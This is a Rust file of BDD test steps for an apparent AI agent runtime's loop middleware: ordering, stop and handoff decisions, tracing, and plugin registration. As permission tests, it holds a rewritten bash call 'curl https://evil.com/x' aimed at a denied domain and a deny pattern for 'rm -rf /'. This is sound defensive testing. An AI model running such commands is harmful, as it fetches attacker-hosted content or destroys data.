use std::cell::RefCell;
use std::sync::Arc;

use rstest_bdd_macros::{given, then, when};

use crate::bdd::fixtures::{AgentState, Workspace};
use crate::bdd::helpers::agent_submit_root;
use crate::bdd::prelude::*;
use crate::bdd::steps_agent_runtime::{
    ar_make_runner, ar_store_events, ar_store_runner, ar_take_run_store,
};

use xylitol_plugin_sdk::{
    AfterTurnCtx, BeforeLlmRequestCtx, BeforeToolCtx, BeforeTurnCtx, DecideContinueCtx,
    LoopControl, LoopMiddleware, LoopMiddlewareRegistry, LoopStage, LoopStep, PlanGateway,
};
use xylitol_runtime::agent::runtime::XyEvent;

thread_local! {
    static LOOP_REGISTRY: RefCell<Option<Arc<LoopMiddlewareRegistry>>> = const { RefCell::new(None) };
    static LOOP_CHAIN_IDS: RefCell<Vec<String>> = const { RefCell::new(Vec::new()) };
    static LOOP_TRACE_PROPS: RefCell<Vec<(String, String)>> = const { RefCell::new(Vec::new()) };
    static LOOP_COLLECT: RefCell<Option<xylitol_plugin_sdk::SpanCollectScope>> =
        const { RefCell::new(None) };
    static LOOP_PLUGIN_REGISTRY: RefCell<Option<Arc<LoopMiddlewareRegistry>>> =
        const { RefCell::new(None) };
    static LOOP_PLUGIN_FIBER: RefCell<Option<xylitol_plugin_sdk::rt::FiberView>> =
        const { RefCell::new(None) };
    static LOOP_PLUGIN_CTX: RefCell<Option<xylitol_plugin_sdk::rt::Ctx>> = const { RefCell::new(None) };
    static LOOP_SETTLEMENT: RefCell<Vec<u64>> = const { RefCell::new(Vec::new()) };
    static LOOP_SECOND_CALLS: RefCell<usize> = const { RefCell::new(0) };
    static LOOP_AFTER_TURN_CALLS: RefCell<usize> = const { RefCell::new(0) };
}

struct CountingStopper {
    calls: Arc<std::sync::atomic::AtomicUsize>,
    stop_on_first: bool,
}

struct PlainTool {
    name: &'static str,
}

#[async_trait::async_trait]
impl xylitol_plugin_sdk::XyTool for PlainTool {
    fn name(&self) -> &str {
        self.name
    }

    fn description(&self) -> &str {
        "bdd plain tool"
    }

    fn parameters_schema(&self) -> serde_json::Value {
        serde_json::json!({"type": "object", "properties": {}})
    }

    async fn execute(
        &self,
        _ctx: &xylitol_plugin_sdk::XyToolCtx,
        _args: serde_json::Value,
    ) -> Result<String, xylitol_plugin_sdk::error::XyToolError> {
        Ok(format!("{}-ok", self.name))
    }
}

#[async_trait::async_trait]
impl LoopMiddleware for CountingStopper {
    fn id(&self) -> &str {
        if self.stop_on_first {
            "preflight-stopper"
        } else {
            "preflight-observer"
        }
    }

    fn order(&self) -> i64 {
        if self.stop_on_first { 0 } else { 1 }
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::BeforeTool]
    }

    async fn before_tool(&self, ctx: BeforeToolCtx) -> LoopStep<BeforeToolCtx> {
        let seen = self.calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        if self.stop_on_first {
            return if seen == 0 {
                LoopStep::stopped(ctx)
            } else {
                LoopStep::continued(ctx)
            };
        }
        LOOP_SECOND_CALLS.with(|c| *c.borrow_mut() += 1);
        LoopStep::continued(ctx)
    }
}

struct Scripted {
    id: &'static str,
    order: i64,
    stages: &'static [LoopStage],
    decide: LoopControl,
    deny_tool: Option<&'static str>,
    rewrite_args: Option<serde_json::Value>,
}

#[async_trait::async_trait]
impl LoopMiddleware for Scripted {
    fn id(&self) -> &str {
        self.id
    }

    fn order(&self) -> i64 {
        self.order
    }

    fn stages(&self) -> &'static [LoopStage] {
        self.stages
    }

    async fn before_tool(&self, mut ctx: BeforeToolCtx) -> LoopStep<BeforeToolCtx> {
        if self.deny_tool.is_some_and(|name| ctx.tool_name == name) {
            return LoopStep::stopped(ctx);
        }
        if let Some(args) = &self.rewrite_args {
            ctx.args = args.clone();
        }
        LoopStep::continued(ctx)
    }

    async fn decide_continue(&self, ctx: DecideContinueCtx) -> LoopStep<DecideContinueCtx> {
        LoopStep {
            ctx,
            control: self.decide,
            properties: Vec::new(),
        }
    }
}

struct InjectFragment;

#[async_trait::async_trait]
impl LoopMiddleware for InjectFragment {
    fn id(&self) -> &str {
        "inject-fragment"
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::BeforeTurn]
    }

    async fn before_turn(&self, mut ctx: BeforeTurnCtx) -> LoopStep<BeforeTurnCtx> {
        ctx.system_fragments
            .push("MIDDLEWARE_FRAGMENT_MARKER_0123456789".into());
        LoopStep::continued(ctx)
    }
}

struct RewriteAssistant;

#[async_trait::async_trait]
impl LoopMiddleware for RewriteAssistant {
    fn id(&self) -> &str {
        "rewrite-assistant"
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::AfterLlmResponse]
    }

    async fn after_llm_response(
        &self,
        mut ctx: xylitol_plugin_sdk::AfterLlmResponseCtx,
    ) -> LoopStep<xylitol_plugin_sdk::AfterLlmResponseCtx> {
        ctx.assistant = xylitol_plugin_sdk::AgentMessage::Llm(
            xylitol_plugin_sdk::XyLlmMessage::assistant("replaced"),
        );
        LoopStep::continued(ctx)
    }
}

struct StopAfterTurn;

#[async_trait::async_trait]
impl LoopMiddleware for StopAfterTurn {
    fn id(&self) -> &str {
        "stop-after-turn"
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::AfterTurn]
    }

    async fn after_turn(&self, ctx: AfterTurnCtx) -> LoopStep<AfterTurnCtx> {
        LOOP_AFTER_TURN_CALLS.with(|c| *c.borrow_mut() += 1);
        LoopStep::stopped(ctx)
    }
}

struct TouchMessages;

#[async_trait::async_trait]
impl LoopMiddleware for TouchMessages {
    fn id(&self) -> &str {
        "touch-messages"
    }

    fn order(&self) -> i64 {
        1
    }

    fn stages(&self) -> &'static [LoopStage] {
        &[LoopStage::BeforeLlmRequest]
    }

    async fn before_llm_request(
        &self,
        mut ctx: BeforeLlmRequestCtx,
    ) -> LoopStep<BeforeLlmRequestCtx> {
        ctx.messages.push(xylitol_plugin_sdk::AgentMessage::Llm(
            xylitol_plugin_sdk::XyLlmMessage::user("middleware fragment"),
        ));
        LoopStep::continued(ctx).with_property("loop.middleware.test.marker", "touch")
    }
}

fn scripted(
    id: &'static str,
    order: i64,
    stages: &'static [LoopStage],
    decide: LoopControl,
) -> Arc<dyn LoopMiddleware> {
    Arc::new(Scripted {
        id,
        order,
        stages,
        decide,
        deny_tool: None,
        rewrite_args: None,
    })
}

fn fresh_registry() -> Arc<LoopMiddlewareRegistry> {
    Arc::new(LoopMiddlewareRegistry::new())
}

#[given("注册 before_llm_request 阶段 order 10 与 order 5 的两个中间件")]
pub(crate) fn g_register_two_ordered() {
    let registry = fresh_registry();
    registry
        .register(scripted(
            "order-ten",
            10,
            &[LoopStage::BeforeLlmRequest],
            LoopControl::Continue,
        ))
        .expect("register order-ten");
    registry
        .register(scripted(
            "order-five",
            5,
            &[LoopStage::BeforeLlmRequest],
            LoopControl::Continue,
        ))
        .expect("register order-five");
    LOOP_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
}

#[when("读取中间件链快照并注销 order 5 的中间件")]
pub(crate) fn w_snapshot_then_unregister() {
    let registry = LOOP_REGISTRY
        .with(|slot| slot.borrow().clone())
        .expect("registry");
    let ids: Vec<String> = registry
        .snapshot()
        .before_llm_request
        .iter()
        .map(|mw| mw.id().to_string())
        .collect();
    assert!(registry.unregister("order-five"));
    let after: Vec<String> = registry
        .snapshot()
        .before_llm_request
        .iter()
        .map(|mw| mw.id().to_string())
        .collect();
    LOOP_CHAIN_IDS.with(|slot| {
        let mut out = slot.borrow_mut();
        out.clear();
        out.extend(ids);
        out.extend(after);
    });
}

#[then("首次快照按 order 升序且注销后不再含该 id")]
pub(crate) fn t_snapshot_ordered_and_clean() {
    LOOP_CHAIN_IDS.with(|slot| {
        let ids = slot.borrow();
        assert_eq!(
            &ids[..2],
            &["order-five".to_string(), "order-ten".to_string()],
            "snapshot must be ordered by order ascending: {ids:?}"
        );
        assert!(
            !ids[2..].iter().any(|id| id == "order-five"),
            "unregistered middleware must not survive in snapshot: {ids:?}"
        );
    });
}

#[given("未注册任何 loop 中间件")]
pub(crate) fn g_no_middleware(agent: &AgentState, ws: &Workspace) {
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(fresh_registry()));
    set_fake_text("baseline");
    ar_store_runner(runner);
}

#[given("注册 decide_continue 中间件在首次结算返回 stop")]
pub(crate) fn g_decide_stop(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(scripted(
            "stop-at-settle",
            0,
            &[LoopStage::DecideContinue],
            LoopControl::Stop,
        ))
        .expect("register stop");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("stop after settle");
    ar_store_runner(runner);
}

#[given("注册 decide_continue 中间件返回 handoff")]
pub(crate) fn g_decide_handoff(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(scripted(
            "handoff-at-settle",
            0,
            &[LoopStage::DecideContinue],
            LoopControl::Handoff,
        ))
        .expect("register handoff");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("handoff after settle");
    ar_store_runner(runner);
}

#[given("注册 after_turn 中间件返回 stop 且入队 follow_up")]
pub(crate) fn g_after_turn_stop_with_followup(agent: &AgentState, ws: &Workspace) {
    LOOP_AFTER_TURN_CALLS.with(|c| *c.borrow_mut() = 0);
    let registry = fresh_registry();
    registry
        .register(Arc::new(StopAfterTurn))
        .expect("register stop-after-turn");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    runner.follow_up("after_turn 不得吞掉的追问");
    set_fake_text("after turn ignored");
    ar_store_runner(runner);
}

#[then("after_turn 中间件已被调用且 run 继续到下一轮")]
pub(crate) fn t_after_turn_stop_ignored() {
    let calls = LOOP_AFTER_TURN_CALLS.with(|c| *c.borrow());
    assert!(calls >= 1, "after_turn must run after a turn");
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let turns = events
        .iter()
        .filter(|e| matches!(e, XyEvent::TurnStart { .. }))
        .count();
    assert_eq!(
        turns, 2,
        "a stop from after_turn must be ignored, so the follow_up turn still runs: {events:?}"
    );
    assert!(
        !events
            .iter()
            .any(|e| matches!(e, XyEvent::Error(err) if err.kind.starts_with("LoopMiddleware"))),
        "ignoring after_turn control must not surface as a middleware error: {events:?}"
    );
}

#[given("注册 before_tool 中间件拒绝 bash")]
pub(crate) fn g_before_tool_deny(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(Scripted {
            id: "deny-bash",
            order: 0,
            stages: &[LoopStage::BeforeTool],
            decide: LoopControl::Continue,
            deny_tool: Some("bash"),
            rewrite_args: None,
        }))
        .expect("register deny-bash");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("bash", r#"{"command":"echo hi"}"#);
    ar_store_runner(runner);
}

#[given("注册 before_tool 中间件把 bash 参数改为访问被拒域名且权限引擎拒绝该域名")]
pub(crate) fn g_before_tool_rewrite(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(Arc::new(Scripted {
            id: "rewrite-bash",
            order: 0,
            stages: &[LoopStage::BeforeTool],
            decide: LoopControl::Continue,
            deny_tool: None,
            rewrite_args: Some(serde_json::json!({ "command": "curl https://evil.com/x" })),
        }))
        .expect("register rewrite-bash");
    let mut runner = ar_make_runner(agent, ws);
    let permission = xylitol_official_plugin_config::types::PermissionConfig {
        enabled: true,
        backend: xylitol_official_plugin_config::types::PermissionBackend::Glob,
        filesystem: xylitol_official_plugin_config::types::PermissionFilesystemConfig {
            read_allowed: vec![],
            write_allowed: vec![],
            write_denied: vec![],
        },
        network: xylitol_official_plugin_config::types::PermissionNetworkConfig {
            allowed_domains: vec![],
            denied_domains: vec!["evil.com".into()],
        },
        process: xylitol_official_plugin_config::types::PermissionProcessConfig {
            allowed_paths: vec![],
        },
    }
    .to_permission();
    runner.set_permission(permission);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("ack");
    xylitol_kernel::provider::factory::set_fake_tool_call("bash", r#"{"command":"echo safe"}"#);
    ar_store_runner(runner);
}

#[given("注册 decide_continue 中间件总是返回 continue 且无新工具与新用户消息")]
pub(crate) fn g_decide_always_continue(agent: &AgentState, ws: &Workspace) {
    let registry = fresh_registry();
    registry
        .register(scripted(
            "always-continue",
            0,
            &[LoopStage::DecideContinue],
            LoopControl::Continue,
        ))
        .expect("register always-continue");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("no progress");
    ar_store_runner(runner);
}

#[given("注册 before_llm_request 中间件且在观测闸开启下运行一回合")]
pub(crate) async fn g_trace_before_llm_request(agent: &AgentState, ws: &Workspace) {
    use xylitol_plugin_sdk::{SpanCollectScope, set_provider_trace_active};

    let registry = fresh_registry();
    registry
        .register(Arc::new(TouchMessages))
        .expect("register touch-messages");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("traced");
    set_provider_trace_active(true);
    LOOP_COLLECT.with(|slot| slot.borrow_mut().replace(SpanCollectScope::enter()));
    let local = {
        let mut stream = agent_submit_root(&mut runner, "trace run").await;
        let mut local = Vec::new();
        while let Some(e) = stream.next().await {
            if let XyEvent::Error(err) = &e {
                panic!("trace run failed: {err:?}");
            }
            local.push(e);
        }
        local
    };
    ar_store_runner(runner);
    ar_store_events(local);
    set_provider_trace_active(false);
}

#[when("读取 loop.middleware span 属性")]
pub(crate) fn w_read_loop_spans() {
    fastrace::flush();
    let props: Vec<(String, String)> = LOOP_COLLECT.with(|slot| {
        slot.borrow()
            .as_ref()
            .expect("collect scope mounted")
            .records()
            .into_iter()
            .filter(|span| span.name == "loop.middleware")
            .flat_map(|span| {
                span.properties
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect::<Vec<_>>()
            })
            .collect()
    });
    LOOP_TRACE_PROPS.with(|slot| {
        let mut out = slot.borrow_mut();
        out.clear();
        out.extend(props);
    });
}

#[then("属性含该中间件 id、阶段名与改动摘要")]
pub(crate) fn t_trace_props() {
    LOOP_TRACE_PROPS.with(|slot| {
        let props = slot.borrow();
        let span = props
            .split(|(k, v)| k == "loop.middleware.id" && v == "touch-messages")
            .nth(1)
            .expect("touch-messages span in trace");
        let get = |key: &str| span.iter().find(|(k, _)| k == key).map(|(_, v)| v.as_str());
        assert_eq!(
            get("loop.middleware.stage"),
            Some("before_llm_request"),
            "{props:?}"
        );
        let changed = get("loop.middleware.changed").expect("changed summary");
        assert_ne!(changed, "none", "middleware changed messages: {props:?}");
        assert_eq!(
            get("loop.middleware.test.marker"),
            Some("touch"),
            "middleware semantic properties must reach the span: {props:?}"
        );
        assert_eq!(
            get("langfuse.observation.type"),
            Some("span"),
            "loop.middleware must be a Langfuse span: {props:?}"
        );
        assert!(
            get("langfuse.session.id").is_some(),
            "loop.middleware must carry the session id: {props:?}"
        );
    });
}

#[given("loop 策略插件配置缺省")]
pub(crate) fn g_example_default() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_loop_policies::LoopPoliciesPlugin::new(
            &xylitol_official_plugin_loop_policies::LoopPoliciesConfig::default(),
        )
        .expect("loop policies plugin"),
    );
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用 loop 策略插件装配运行时")]
pub(crate) async fn g_example_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_loop_policies::LoopPoliciesPlugin::new(
            &xylitol_official_plugin_loop_policies::LoopPoliciesConfig {
                enabled: true,
                max_settles: Some(2),
                deny_bash_patterns: vec!["rm -rf /".into()],
                self_heal: Default::default(),
                generator_critic: Default::default(),
                tool_exposure: Default::default(),
            },
        )
        .expect("loop policies plugin"),
    );
    for _ in 0..64 {
        if !registry.is_empty() {
            break;
        }
        tokio::task::yield_now().await;
    }
    assert_eq!(registry.ids(), vec!["loop-policies".to_string()]);
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用 todo 进度的 todo 插件装配运行时")]
pub(crate) async fn g_todo_progress_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_todo::TodoPlugin::new(&xylitol_official_plugin_todo::TodoConfig {
            enabled: true,
            progress: true,
            ..Default::default()
        })
        .expect("todo plugin"),
    );
    for _ in 0..64 {
        if !registry.is_empty() {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用 todo 提醒的 todo 插件装配运行时")]
pub(crate) async fn g_todo_reminder_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_todo::TodoPlugin::new(&xylitol_official_plugin_todo::TodoConfig {
            enabled: true,
            reminder: true,
            ..Default::default()
        })
        .expect("todo plugin"),
    );
    for _ in 0..64 {
        if !registry.is_empty() {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用 todo checkpoint 的 todo 插件装配运行时")]
pub(crate) async fn g_todo_checkpoint_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_todo::TodoPlugin::new(&xylitol_official_plugin_todo::TodoConfig {
            enabled: true,
            checkpoint: true,
            ..Default::default()
        })
        .expect("todo plugin"),
    );
    for _ in 0..64 {
        if !registry.is_empty() {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用工具收窄的 loop 策略插件装配运行时")]
pub(crate) async fn g_example_tool_exposure_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_loop_policies::LoopPoliciesPlugin::new(
            &xylitol_official_plugin_loop_policies::LoopPoliciesConfig {
                enabled: true,
                max_settles: Some(2),
                deny_bash_patterns: vec![],
                self_heal: Default::default(),
                generator_critic: Default::default(),
                tool_exposure: xylitol_official_plugin_loop_policies::ToolExposureConfig {
                    enabled: true,
                    allow: vec!["read".into()],
                    ..Default::default()
                },
            },
        )
        .expect("loop policies plugin"),
    );
    for _ in 0..64 {
        if registry.ids().len() == 2 {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用自愈的 loop 策略插件装配运行时")]
pub(crate) async fn g_example_self_heal_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_loop_policies::LoopPoliciesPlugin::new(
            &xylitol_official_plugin_loop_policies::LoopPoliciesConfig {
                enabled: true,
                max_settles: Some(2),
                deny_bash_patterns: vec![],
                self_heal: xylitol_official_plugin_loop_policies::SelfHealConfig {
                    enabled: true,
                    ..Default::default()
                },
                generator_critic: Default::default(),
                tool_exposure: Default::default(),
            },
        )
        .expect("loop policies plugin"),
    );
    for _ in 0..64 {
        if registry.ids().len() == 2 {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用生成评审的 loop 策略插件装配运行时")]
pub(crate) async fn g_example_generator_critic_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_loop_policies::LoopPoliciesPlugin::new(
            &xylitol_official_plugin_loop_policies::LoopPoliciesConfig {
                enabled: true,
                max_settles: Some(2),
                deny_bash_patterns: vec![],
                self_heal: Default::default(),
                generator_critic: xylitol_official_plugin_loop_policies::GeneratorCriticConfig {
                    enabled: true,
                    ..Default::default()
                },
                tool_exposure: Default::default(),
            },
        )
        .expect("loop policies plugin"),
    );
    for _ in 0..64 {
        if registry.ids().len() == 2 {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[given("以启用 workflow 的 workflow 插件装配运行时")]
pub(crate) async fn g_workflow_enabled() {
    use xylitol_plugin_sdk::rt::CtxHost;

    let ctx = xylitol_plugin_sdk::rt::Ctx::root().expect("ctx root");
    let registry = fresh_registry();
    ctx.provide_as::<xylitol_plugin_sdk::LoopMiddlewareRegistry>(registry.clone())
        .expect("provide registry");
    let fiber = ctx.plugin(
        xylitol_official_plugin_workflow::WorkflowPlugin::new(
            &xylitol_official_plugin_workflow::WorkflowConfig {
                enabled: true,
                ..Default::default()
            },
        )
        .expect("workflow plugin"),
    );
    for _ in 0..64 {
        if !registry.is_empty() {
            break;
        }
        tokio::task::yield_now().await;
    }
    LOOP_PLUGIN_REGISTRY.with(|slot| slot.borrow_mut().replace(registry));
    LOOP_PLUGIN_FIBER.with(|slot| slot.borrow_mut().replace(fiber));
    LOOP_PLUGIN_CTX.with(|slot| slot.borrow_mut().replace(ctx));
}

#[when("查询中间件注册表")]
pub(crate) fn w_query_registry_ids() {
    let registry = LOOP_PLUGIN_REGISTRY
        .with(|slot| slot.borrow().clone())
        .expect("registry");
    LOOP_CHAIN_IDS.with(|slot| {
        let mut out = slot.borrow_mut();
        out.clear();
        out.extend(registry.ids());
    });
}

#[then("注册表含 todo-progress")]
pub(crate) fn t_registry_has_todo_progress() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["todo-progress".to_string()],
            "todo progress must register the todo-progress middleware"
        );
    });
}

#[then("注册表含 todo-reminder")]
pub(crate) fn t_registry_has_todo_reminder() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["todo-reminder".to_string()],
            "todo reminder must register the todo-reminder middleware"
        );
    });
}

#[then("注册表含 loop-policies 与 tool-exposure")]
pub(crate) fn t_registry_has_tool_exposure() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["tool-exposure".to_string(), "loop-policies".to_string()],
            "tool exposure must register the base middleware and the exposure middleware"
        );
    });
}

#[then("注册表含 todo-checkpoint")]
pub(crate) fn t_registry_has_todo_checkpoint() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["todo-checkpoint".to_string()],
            "todo checkpoint must register the todo-checkpoint middleware"
        );
    });
}

#[then("注册表含 loop-policies 与 self-heal")]
pub(crate) fn t_registry_has_self_heal() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["loop-policies".to_string(), "self-heal".to_string()],
            "self-heal must register the base middleware and the self-heal middleware"
        );
    });
}

#[then("注册表含 loop-policies 与 generator-critic")]
pub(crate) fn t_registry_has_generator_critic() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["loop-policies".to_string(), "generator-critic".to_string()],
            "generator-critic must register the base middleware and the critic middleware"
        );
    });
}

#[then("注册表含 workflow")]
pub(crate) fn t_registry_has_workflow() {
    LOOP_CHAIN_IDS.with(|slot| {
        assert_eq!(
            &*slot.borrow(),
            &["workflow".to_string()],
            "workflow must register the workflow middleware"
        );
    });
}

#[when("装配运行时并查询中间件注册表")]
pub(crate) async fn w_example_query(agent: &AgentState, ws: &Workspace) {
    let registry = LOOP_PLUGIN_REGISTRY
        .with(|slot| slot.borrow().clone())
        .expect("registry");
    assert!(registry.is_empty(), "default config must register nothing");
    let mut runner = ar_make_runner(agent, ws);
    runner.set_loop_middleware(Some(registry));
    set_fake_text("baseline");
    let mut stream = agent_submit_root(&mut runner, "baseline run").await;
    while let Some(e) = stream.next().await {
        if let XyEvent::Error(err) = &e
            && err.kind.starts_with("LoopMiddleware")
        {
            panic!("unconfigured loop example must not emit middleware errors: {err:?}");
        }
    }
    ar_store_runner(runner);
}

#[when("卸载该插件")]
pub(crate) async fn w_example_unload() {
    let fiber = LOOP_PLUGIN_FIBER
        .with(|slot| slot.borrow_mut().take())
        .expect("plugin fiber");
    fiber.dispose().await.expect("dispose plugin");
}

#[then("注册表为空且运行无额外事件")]
pub(crate) fn t_example_zero() {
    let registry = LOOP_PLUGIN_REGISTRY
        .with(|slot| slot.borrow().clone())
        .expect("registry");
    assert!(registry.is_empty());
    assert!(registry.snapshot().is_empty());
}

#[then("注册表不再含该插件的中间件")]
pub(crate) fn t_example_unloaded() {
    let registry = LOOP_PLUGIN_REGISTRY
        .with(|slot| slot.borrow().clone())
        .expect("registry");
    assert!(registry.is_empty(), "unload must remove example middleware");
    assert!(registry.snapshot().before_tool.is_empty());
}

#[then("出现 AgentEnd 且无中间件错误事件")]
pub(crate) fn t_baseline_no_middleware_errors() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    assert!(
        events.iter().any(|e| matches!(e, XyEvent::AgentEnd { .. })),
        "expected AgentEnd: {events:?}"
    );
    assert!(
        !events.iter().any(|e| matches!(
            e,
            XyEvent::Error(err) if err.kind.starts_with("LoopMiddleware")
        )),
        "empty chain must not produce middleware errors: {events:?}"
    );
}

#[then("出现 AgentEnd 且其后无新的 TurnStart")]
pub(crate) fn t_stop_no_further_turn() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let end = events
        .iter()
        .position(|e| matches!(e, XyEvent::AgentEnd { .. }))
        .expect("AgentEnd");
    assert!(
        !events[end..]
            .iter()
            .any(|e| matches!(e, XyEvent::TurnStart { .. })),
        "stop must not start another turn: {events:?}"
    );
}

#[then("事件流含 kind 为 LoopMiddlewareHandoffUnsupported 的错误")]
pub(crate) fn t_handoff_error() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    assert!(
        events.iter().any(|e| matches!(
            e,
            XyEvent::Error(err) if err.kind == "LoopMiddlewareHandoffUnsupported"
        )),
        "expected handoff unsupported error: {events:?}"
    );
}

#[then("事件流含 kind 为 LoopMiddlewareLimit 的错误且随后出现 AgentEnd")]
pub(crate) fn t_limit_error() {
    let events = crate::bdd::steps_agent_runtime::ar_events();
    let limit = events
        .iter()
        .position(|e| matches!(e, XyEvent::Error(err) if err.kind == "LoopMiddlewareLimit"))
        .expect("LoopMiddlewareLimit error");
    let end = events
        .iter()
        .position(|e| matches!(e, XyEvent::AgentEnd { .. }))
        .expect("AgentEnd");
    assert!(limit < end, "limit error must precede AgentEnd: {events:?}");
}

#[then("tool-error 回写且原因含 loop middleware")]
